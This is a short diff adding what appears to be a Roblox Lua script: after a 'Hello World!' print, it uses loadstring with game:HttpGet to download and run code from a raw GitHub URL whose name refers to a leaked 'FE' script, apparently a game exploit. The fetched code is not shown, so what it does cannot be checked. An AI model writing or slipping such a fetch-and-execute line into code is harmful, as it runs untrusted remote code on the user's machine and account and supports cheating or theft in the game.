@@ -1,0 +1,4 @@
+print("Hello World!")
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pinkgithub1/Oblooveon-leaked-FE-/main/main%20page"))()
